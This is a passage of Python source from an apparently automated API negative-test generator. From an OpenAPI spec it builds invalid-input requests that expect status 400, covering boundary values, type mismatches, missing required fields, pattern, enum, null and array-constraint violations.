                        400
                    )
                    test_cases.append(test_case)

        # Test request body fields with format constraints
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_format_tests = await self._generate_body_format_tests(endpoint, api_spec)
            test_cases.extend(body_format_tests)

        return test_cases

    async def _generate_body_format_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate format-specific tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                prop_format = prop_schema.get("format")
                if prop_format:
                    invalid_values = self._get_format_specific_invalid_values(prop_format)

                    for invalid_value in invalid_values[:3]:  # Limit to 3 per field
                        invalid_body = base_body.copy()
                        invalid_body[prop_name] = invalid_value

                        test_case = self._create_test_case(
                            endpoint=self._build_endpoint_path(endpoint),
                            method=endpoint["method"],
                            description=f"Test {prop_name} with invalid {prop_format} format: {invalid_value}",
                            body=invalid_body,
                            expected_status=400
                        )
                        test_cases.append(test_case)

        return test_cases

    def _get_format_specific_invalid_values(self, format_type: str) -> List[str]:
        """Get invalid values for specific formats."""
        format_generators = {
            "email": self._generate_invalid_email,
            "uri": self._generate_invalid_url,
            "url": self._generate_invalid_url,
            "uuid": self._generate_invalid_uuid,
            "date": self._generate_invalid_date,
            "date-time": self._generate_invalid_date,
            "phone": self._generate_invalid_phone,
            "ipv4": self._generate_invalid_ip_address,
            "ipv6": self._generate_invalid_ip_address,
            "credit-card": self._generate_invalid_credit_card,
        }

        generator = format_generators.get(format_type, lambda: ["invalid_format_value"])
        return generator()

    async def _generate_comprehensive_bva_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate comprehensive boundary value analysis tests."""
        test_cases = []

        # Enhanced parameter boundary tests
        for param in endpoint["parameters"]:
            param_bva_tests = self._generate_enhanced_parameter_bva_tests(param, endpoint, api_spec)
            test_cases.extend(param_bva_tests)

        # Enhanced request body boundary tests
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_bva_tests = await self._generate_enhanced_body_bva_tests(endpoint, api_spec)
            test_cases.extend(body_bva_tests)

        return test_cases

    def _generate_enhanced_parameter_bva_tests(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate enhanced BVA tests including min-1, max+1, exact boundaries."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        param_type = schema.get("type", "string")

        # Numeric boundary testing (min-1, min, min+1, max-1, max, max+1)
        if param_type in ["integer", "number"]:
            test_cases.extend(self._generate_comprehensive_numeric_boundaries(param, endpoint, api_spec))

        # String length boundary testing
        elif param_type == "string":
            test_cases.extend(self._generate_comprehensive_string_boundaries(param, endpoint, api_spec))

        # Array size boundary testing
        elif param_type == "array":
            test_cases.extend(self._generate_comprehensive_array_boundaries(param, endpoint, api_spec))

        return test_cases

    def _generate_comprehensive_numeric_boundaries(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate comprehensive numeric boundary tests."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]

        # Test minimum boundaries
        if "minimum" in schema:
            minimum = schema["minimum"]
            exclusive = schema.get("exclusiveMinimum", False)

            boundary_tests = [
                (minimum - 1, f"Test {param_name} below minimum (min-1)"),
                (minimum, f"Test {param_name} at minimum boundary" + (" (exclusive)" if exclusive else "")),
            ]

            if not exclusive:
                boundary_tests.append((minimum + 1, f"Test {param_name} just above minimum (min+1)"))

            for value, description in boundary_tests:
                expected_status = 400 if (value < minimum or (exclusive and value == minimum)) else 200
                if expected_status == 400:  # Only add negative tests
                    test_case = self._create_parameter_test_case(
                        endpoint, param, value, description, expected_status
                    )
                    test_cases.append(test_case)

        # Test maximum boundaries
        if "maximum" in schema:
            maximum = schema["maximum"]
            exclusive = schema.get("exclusiveMaximum", False)

            boundary_tests = [
                (maximum + 1, f"Test {param_name} above maximum (max+1)"),
                (maximum, f"Test {param_name} at maximum boundary" + (" (exclusive)" if exclusive else "")),
            ]

            if not exclusive:
                boundary_tests.append((maximum - 1, f"Test {param_name} just below maximum (max-1)"))

            for value, description in boundary_tests:
                expected_status = 400 if (value > maximum or (exclusive and value == maximum)) else 200
                if expected_status == 400:  # Only add negative tests
                    test_case = self._create_parameter_test_case(
                        endpoint, param, value, description, expected_status
                    )
                    test_cases.append(test_case)

        # Test extreme values
        extreme_tests = [
            (float('inf'), f"Test {param_name} with infinity"),
            (float('-inf'), f"Test {param_name} with negative infinity"),
            (float('nan'), f"Test {param_name} with NaN"),
        ]

        for value, description in extreme_tests:
            test_case = self._create_parameter_test_case(
                endpoint, param, value, description, 400
            )
            test_cases.append(test_case)

        return test_cases

    def _generate_comprehensive_string_boundaries(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate comprehensive string boundary tests."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]

        # Test minLength boundaries
        if "minLength" in schema:
            min_length = schema["minLength"]
            if min_length > 0:
                boundary_tests = [
                    ("", f"Test {param_name} with empty string (length=0)"),
                    ("x" * (min_length - 1), f"Test {param_name} below minimum length (length={min_length-1})"),
                ]

                for value, description in boundary_tests:
                    test_case = self._create_parameter_test_case(
                        endpoint, param, value, description, 400
                    )
                    test_cases.append(test_case)

        # Test maxLength boundaries
        if "maxLength" in schema:
            max_length = schema["maxLength"]
            boundary_tests = [
                ("x" * (max_length + 1), f"Test {param_name} above maximum length (length={max_length+1})"),
                ("x" * (max_length + 100), f"Test {param_name} significantly above maximum length (length={max_length+100})"),
            ]

            for value, description in boundary_tests:
                test_case = self._create_parameter_test_case(
                    endpoint, param, value, description, 400
                )
                test_cases.append(test_case)

        return test_cases

    def _generate_comprehensive_array_boundaries(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate comprehensive array boundary tests."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]

        # Test minItems boundaries
        if "minItems" in schema:
            min_items = schema["minItems"]
            if min_items > 0:
                boundary_tests = [
                    ([], f"Test {param_name} with empty array (items=0)"),
                    (["item"] * (min_items - 1), f"Test {param_name} below minimum items (items={min_items-1})"),
                ]

                for value, description in boundary_tests:
                    test_case = self._create_parameter_test_case(
                        endpoint, param, value, description, 400
                    )
                    test_cases.append(test_case)

        # Test maxItems boundaries
        if "maxItems" in schema:
            max_items = schema["maxItems"]
            boundary_tests = [
                (["item"] * (max_items + 1), f"Test {param_name} above maximum items (items={max_items+1})"),
                (["item"] * (max_items + 10), f"Test {param_name} significantly above maximum items (items={max_items+10})"),
            ]

            for value, description in boundary_tests:
                test_case = self._create_parameter_test_case(
                    endpoint, param, value, description, 400
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_enhanced_body_bva_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate enhanced BVA tests for request body with comprehensive boundaries."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                # Test numeric boundaries
                if prop_schema.get("type") in ["integer", "number"]:
                    test_cases.extend(self._generate_property_numeric_boundaries(
                        prop_name, prop_schema, base_body, endpoint
                    ))

                # Test string boundaries
                elif prop_schema.get("type") == "string":
                    test_cases.extend(self._generate_property_string_boundaries(
                        prop_name, prop_schema, base_body, endpoint
                    ))

                # Test array boundaries
                elif prop_schema.get("type") == "array":
                    test_cases.extend(self._generate_property_array_boundaries(
                        prop_name, prop_schema, base_body, endpoint
                    ))

        return test_cases

    def _generate_property_numeric_boundaries(
        self,
        prop_name: str,
        prop_schema: Dict[str, Any],
        base_body: Dict[str, Any],
        endpoint: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate numeric boundary tests for a property."""
        test_cases = []

        # Test minimum boundaries
        if "minimum" in prop_schema:
            minimum = prop_schema["minimum"]
            exclusive = prop_schema.get("exclusiveMinimum", False)

            boundary_values = [minimum - 1]
            if exclusive:
                boundary_values.append(minimum)

            for value in boundary_values:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = value

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} boundary violation (value={value})",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)

        # Test maximum boundaries
        if "maximum" in prop_schema:
            maximum = prop_schema["maximum"]
            exclusive = prop_schema.get("exclusiveMaximum", False)

            boundary_values = [maximum + 1]
            if exclusive:
                boundary_values.append(maximum)

            for value in boundary_values:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = value

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} boundary violation (value={value})",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)

        return test_cases

    def _generate_property_string_boundaries(
        self,
        prop_name: str,
        prop_schema: Dict[str, Any],
        base_body: Dict[str, Any],
        endpoint: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate string boundary tests for a property."""
        test_cases = []

        # Test minLength violations
        if "minLength" in prop_schema:
            min_length = prop_schema["minLength"]
            if min_length > 0:
                invalid_values = [
                    "",  # Empty string
                    "x" * (min_length - 1),  # Just below minimum
                ]

                for value in invalid_values:
                    invalid_body = base_body.copy()
                    invalid_body[prop_name] = value

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {prop_name} minLength violation (length={len(value)})",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        # Test maxLength violations
        if "maxLength" in prop_schema:
            max_length = prop_schema["maxLength"]
            invalid_values = [
                "x" * (max_length + 1),    # Just above maximum
                "x" * (max_length + 100),  # Significantly above maximum
            ]

            for value in invalid_values:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = value

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} maxLength violation (length={len(value)})",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)

        return test_cases

    def _generate_property_array_boundaries(
        self,
        prop_name: str,
        prop_schema: Dict[str, Any],
        base_body: Dict[str, Any],
        endpoint: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate array boundary tests for a property."""
        test_cases = []

        # Test minItems violations
        if "minItems" in prop_schema:
            min_items = prop_schema["minItems"]
            if min_items > 0:
                invalid_values = [
                    [],  # Empty array
                    ["item"] * (min_items - 1),  # Just below minimum
                ]

                for value in invalid_values:
                    invalid_body = base_body.copy()
                    invalid_body[prop_name] = value

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {prop_name} minItems violation (items={len(value)})",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        # Test maxItems violations
        if "maxItems" in prop_schema:
            max_items = prop_schema["maxItems"]
            invalid_values = [
                ["item"] * (max_items + 1),   # Just above maximum
                ["item"] * (max_items + 10),  # Significantly above maximum
            ]

            for value in invalid_values:
                invalid_body = base_body.copy()
                invalid_body[prop_name] = value

                test_case = self._create_test_case(
                    endpoint=self._build_endpoint_path(endpoint),
                    method=endpoint["method"],
                    description=f"Test {prop_name} maxItems violation (items={len(value)})",
                    body=invalid_body,
                    expected_status=400
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_type_mismatch_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate comprehensive type mismatch tests."""
        test_cases = []

        # Test parameter type mismatches
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            expected_type = schema.get("type", "string")
            wrong_values = self._get_all_wrong_type_values(expected_type)

            for wrong_value in wrong_values[:3]:  # Limit to 3 per parameter
                test_case = self._create_parameter_test_case(
                    endpoint, param, wrong_value,
                    f"Test {param['name']} with wrong type (expected {expected_type}, got {type(wrong_value).__name__})",
                    400
                )
                test_cases.append(test_case)

        # Test request body type mismatches
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_type_tests = await self._generate_body_type_mismatch_tests(endpoint, api_spec)
            test_cases.extend(body_type_tests)

        return test_cases

    async def _generate_body_type_mismatch_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate type mismatch tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                expected_type = prop_schema.get("type", "string")
                wrong_values = self._get_all_wrong_type_values(expected_type)

                for wrong_value in wrong_values[:2]:  # Limit to 2 per property
                    invalid_body = base_body.copy()
                    invalid_body[prop_name] = wrong_value

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {prop_name} with wrong type (expected {expected_type}, got {type(wrong_value).__name__})",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    async def _generate_required_field_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate systematic tests for removing each required field."""
        test_cases = []

        # Test missing required parameters (one at a time)
        required_params = [p for p in endpoint["parameters"] if p.get("required", False)]
        for param in required_params:
            test_case = self._create_missing_parameter_test(endpoint, param)
            test_cases.append(test_case)

        # Test missing required body fields (one at a time)
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            required_body_tests = await self._generate_systematic_required_body_tests(endpoint, api_spec)
            test_cases.extend(required_body_tests)

        # Test combinations of missing required fields
        if len(required_params) > 1:
            combo_tests = self._generate_missing_parameter_combinations(endpoint, required_params)
            test_cases.extend(combo_tests)

        return test_cases

    async def _generate_systematic_required_body_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate systematic tests for each required body field."""
        test_cases = []

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            required_fields = resolved_schema.get("required", [])

            # Test removing each required field individually
            for required_field in required_fields:
                base_body = self._generate_base_valid_body(endpoint, api_spec)
                if base_body and required_field in base_body:
                    invalid_body = base_body.copy()
                    del invalid_body[required_field]

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test missing required field: {required_field}",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

            # Test removing combinations of required fields
            if len(required_fields) > 1:
                import itertools
                for r in range(2, min(len(required_fields) + 1, 4)):  # Test combinations of 2-3 fields
                    for field_combo in itertools.combinations(required_fields, r):
                        base_body = self._generate_base_valid_body(endpoint, api_spec)
                        if base_body:
                            invalid_body = base_body.copy()
                            for field in field_combo:
                                if field in invalid_body:
                                    del invalid_body[field]

                            test_case = self._create_test_case(
                                endpoint=self._build_endpoint_path(endpoint),
                                method=endpoint["method"],
                                description=f"Test missing required fields: {', '.join(field_combo)}",
                                body=invalid_body,
                                expected_status=400
                            )
                            test_cases.append(test_case)

        return test_cases

    def _generate_missing_parameter_combinations(
        self,
        endpoint: Dict[str, Any],
        required_params: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Generate tests with combinations of missing required parameters."""
        test_cases = []

        if len(required_params) > 1:
            import itertools
            for r in range(2, min(len(required_params) + 1, 4)):  # Test combinations of 2-3 params
                for param_combo in itertools.combinations(required_params, r):
                    missing_param_names = [p["name"] for p in param_combo]

                    # Build parameters excluding the missing ones
                    headers = {"Content-Type": "application/json", "Accept": "application/json"}
                    query_params = {}
                    path_params = {}

                    for param in endpoint["parameters"]:
                        if param["name"] not in missing_param_names:
                            if param.get("in") == "query":
                                query_params[param["name"]] = self._generate_valid_param_value(param)
                            elif param.get("in") == "path":
                                path_params[param["name"]] = self._generate_valid_param_value(param)
                            elif param.get("in") == "header":
                                headers[param["name"]] = self._generate_valid_param_value(param)

                    # Build the endpoint path
                    actual_path = endpoint["path"]
                    for param_name, param_value in path_params.items():
                        actual_path = actual_path.replace(f"{{{param_name}}}", str(param_value))

                    test_case = self._create_test_case(
                        endpoint=actual_path,
                        method=endpoint["method"],
                        description=f"Test missing required parameters: {', '.join(missing_param_names)}",
                        headers=headers,
                        query_params=query_params,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    async def _generate_constraint_violation_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for schema constraint violations (pattern, minLength, maxLength, etc.)."""
        test_cases = []

        # Test parameter constraint violations
        for param in endpoint["parameters"]:
            constraint_tests = self._generate_parameter_constraint_tests(param, endpoint, api_spec)
            test_cases.extend(constraint_tests)

        # Test request body constraint violations
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_constraint_tests = await self._generate_body_constraint_tests(endpoint, api_spec)
            test_cases.extend(body_constraint_tests)

        return test_cases

    def _generate_parameter_constraint_tests(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate constraint violation tests for a parameter."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]

        # Test pattern violations
        if "pattern" in schema:
            pattern = schema["pattern"]
            invalid_patterns = [
                "DEFINITELY_INVALID_PATTERN_123!@#",
                "spaces not allowed",
                "CAPS_WHEN_LOWERCASE_EXPECTED",
                "special@#$%^&*()characters",
                "unicode_测试_characters",
                "extremely_long_string_that_definitely_violates_any_reasonable_pattern_constraint_" * 10,
            ]

            for invalid_value in invalid_patterns[:3]:  # Limit to 3
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_value,
                    f"Test {param_name} pattern violation: {invalid_value[:50]}...",
                    400
                )
                test_cases.append(test_case)

        # Test multipleOf violations (for numbers)
        if "multipleOf" in schema and schema.get("type") in ["integer", "number"]:
            multiple_of = schema["multipleOf"]
            invalid_values = [
                multiple_of + 1,      # Not a multiple
                multiple_of + 0.5,    # Not a multiple
                multiple_of * 2.3,    # Not a multiple
            ]

            for invalid_value in invalid_values:
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_value,
                    f"Test {param_name} multipleOf violation: {invalid_value}",
                    400
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_body_constraint_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate constraint violation tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                # Test pattern violations
                if "pattern" in prop_schema:
                    pattern_tests = self._generate_pattern_violation_tests(
                        prop_name, prop_schema, base_body, endpoint
                    )
                    test_cases.extend(pattern_tests)

                # Test multipleOf violations
                if "multipleOf" in prop_schema and prop_schema.get("type") in ["integer", "number"]:
                    multiple_tests = self._generate_multiple_of_violation_tests(
                        prop_name, prop_schema, base_body, endpoint
                    )
                    test_cases.extend(multiple_tests)

        return test_cases

    def _generate_pattern_violation_tests(
        self,
        prop_name: str,
        prop_schema: Dict[str, Any],
        base_body: Dict[str, Any],
        endpoint: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate pattern violation tests for a property."""
        test_cases = []
        pattern = prop_schema.get("pattern", "")

        invalid_patterns = [
            "PATTERN_VIOLATION_123",
            "invalid spaces",
            "UPPER_when_lower_expected",
            "special!@#$%characters",
            "unicode_测试_违规",
            "very_long_string_that_violates_pattern_" * 5,
        ]

        for invalid_value in invalid_patterns[:3]:  # Limit to 3
            invalid_body = base_body.copy()
            invalid_body[prop_name] = invalid_value

            test_case = self._create_test_case(
                endpoint=self._build_endpoint_path(endpoint),
                method=endpoint["method"],
                description=f"Test {prop_name} pattern violation: {invalid_value[:30]}...",
                body=invalid_body,
                expected_status=400
            )
            test_cases.append(test_case)

        return test_cases

    def _generate_multiple_of_violation_tests(
        self,
        prop_name: str,
        prop_schema: Dict[str, Any],
        base_body: Dict[str, Any],
        endpoint: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate multipleOf violation tests for a property."""
        test_cases = []
        multiple_of = prop_schema.get("multipleOf", 1)

        invalid_values = [
            multiple_of + 1,
            multiple_of + 0.5,
            multiple_of * 2.3,
        ]

        for invalid_value in invalid_values:
            invalid_body = base_body.copy()
            invalid_body[prop_name] = invalid_value

            test_case = self._create_test_case(
                endpoint=self._build_endpoint_path(endpoint),
                method=endpoint["method"],
                description=f"Test {prop_name} multipleOf violation: {invalid_value}",
                body=invalid_body,
                expected_status=400
            )
            test_cases.append(test_case)

        return test_cases

    async def _generate_null_undefined_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with null values for non-nullable fields."""
        test_cases = []

        # Test null parameters
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            nullable = schema.get("nullable", False)

            if not nullable:
                test_case = self._create_parameter_test_case(
                    endpoint, param, None,
                    f"Test {param['name']} with null value (non-nullable)",
                    400
                )
                test_cases.append(test_case)

        # Test null request body fields
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            null_body_tests = await self._generate_null_body_tests(endpoint, api_spec)
            test_cases.extend(null_body_tests)

        return test_cases

    async def _generate_null_body_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate null value tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                nullable = prop_schema.get("nullable", False)

                if not nullable:
                    invalid_body = base_body.copy()
                    invalid_body[prop_name] = None

                    test_case = self._create_test_case(
                        endpoint=self._build_endpoint_path(endpoint),
                        method=endpoint["method"],
                        description=f"Test {prop_name} with null value (non-nullable)",
                        body=invalid_body,
                        expected_status=400
                    )
                    test_cases.append(test_case)

        return test_cases

    async def _generate_array_constraint_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests for array constraint violations (minItems, maxItems, uniqueItems)."""
        test_cases = []

        # Test array parameter constraints
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            if schema.get("type") == "array":
                array_tests = self._generate_parameter_array_constraint_tests(param, endpoint, api_spec)
                test_cases.extend(array_tests)

        # Test array body field constraints
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_array_tests = await self._generate_body_array_constraint_tests(endpoint, api_spec)
            test_cases.extend(body_array_tests)

        return test_cases

    def _generate_parameter_array_constraint_tests(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate array constraint tests for a parameter."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]

        # Test uniqueItems violations
        if schema.get("uniqueItems", False):
            duplicate_array = ["item1", "item2", "item1", "item3"]  # Contains duplicates
            test_case = self._create_parameter_test_case(
                endpoint, param, duplicate_array,
                f"Test {param_name} uniqueItems violation (contains duplicates)",
                400
            )
            test_cases.append(test_case)

        # Test invalid array item types
        items_schema = schema.get("items", {})
        if items_schema:
            expected_item_type = items_schema.get("type", "string")
            wrong_item_values = self._get_all_wrong_type_values(expected_item_type)

            for wrong_value in wrong_item_values[:2]:  # Limit to 2
                invalid_array = [wrong_value]
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_array,
                    f"Test {param_name} with invalid item type: {type(wrong_value).__name__}",
                    400
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_body_array_constraint_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate array constraint tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                if prop_schema.get("type") == "array":
                    # Test uniqueItems violations
                    if prop_schema.get("uniqueItems", False):
                        invalid_body = base_body.copy()
                        invalid_body[prop_name] = ["item1", "item2", "item1"]  # Duplicates

                        test_case = self._create_test_case(
                            endpoint=self._build_endpoint_path(endpoint),
                            method=endpoint["method"],
                            description=f"Test {prop_name} uniqueItems violation",
                            body=invalid_body,
                            expected_status=400
                        )
                        test_cases.append(test_case)

                    # Test invalid item types
                    items_schema = prop_schema.get("items", {})
                    if items_schema:
                        expected_item_type = items_schema.get("type", "string")
                        wrong_values = self._get_all_wrong_type_values(expected_item_type)

                        for wrong_value in wrong_values[:2]:  # Limit to 2
                            invalid_body = base_body.copy()
                            invalid_body[prop_name] = [wrong_value]

                            test_case = self._create_test_case(
                                endpoint=self._build_endpoint_path(endpoint),
                                method=endpoint["method"],
                                description=f"Test {prop_name} with invalid item type: {type(wrong_value).__name__}",
                                body=invalid_body,
                                expected_status=400
                            )
                            test_cases.append(test_case)

        return test_cases

    async def _generate_enum_invalid_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate tests with values outside enum constraints."""
        test_cases = []

        # Test enum parameter violations
        for param in endpoint["parameters"]:
            schema = param.get("schema", {})
            if "enum" in schema:
                enum_tests = self._generate_parameter_enum_tests(param, endpoint, api_spec)
                test_cases.extend(enum_tests)

        # Test enum body field violations
        if endpoint["method"] in ["POST", "PUT", "PATCH"] and endpoint["requestBody"]:
            body_enum_tests = await self._generate_body_enum_tests(endpoint, api_spec)
            test_cases.extend(body_enum_tests)

        return test_cases

    def _generate_parameter_enum_tests(
        self,
        param: Dict[str, Any],
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate enum violation tests for a parameter."""
        test_cases = []
        schema = param.get("schema", {})
        param_name = param["name"]
        enum_values = schema.get("enum", [])

        if enum_values:
            # Generate various invalid enum values
            invalid_enum_values = [
                "DEFINITELY_NOT_IN_ENUM",
                "invalid_enum_value",
                "wrong_case_maybe",
                "",  # Empty string
                None,  # Null
                123,  # Wrong type if enum is strings
                "special@characters",
                "unicode_测试",
            ]

            # Add case variations if enum contains strings
            string_enums = [v for v in enum_values if isinstance(v, str)]
            if string_enums:
                invalid_enum_values.extend([
                    string_enums[0].upper(),     # Wrong case
                    string_enums[0].lower(),     # Wrong case
                    f"{string_enums[0]}_suffix", # With suffix
                    f"prefix_{string_enums[0]}", # With prefix
                ])

            for invalid_value in invalid_enum_values[:5]:  # Limit to 5
                test_case = self._create_parameter_test_case(
                    endpoint, param, invalid_value,
                    f"Test {param_name} with invalid enum value: {invalid_value}",
                    400
                )
                test_cases.append(test_case)

        return test_cases

    async def _generate_body_enum_tests(
        self,
        endpoint: Dict[str, Any],
        api_spec: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """Generate enum violation tests for request body fields."""
        test_cases = []
        base_body = self._generate_base_valid_body(endpoint, api_spec)
        if not base_body:
            return test_cases

        request_body = endpoint["requestBody"]
        content = request_body.get("content", {})
        json_content = content.get("application/json", {})
        schema = json_content.get("schema", {})
        resolved_schema = self._resolve_schema_ref(schema, api_spec)

        if resolved_schema.get("type") == "object":
            properties = resolved_schema.get("properties", {})

            for prop_name, prop_schema in properties.items():
                if "enum" in prop_schema:
                    enum_values = prop_schema["enum"]

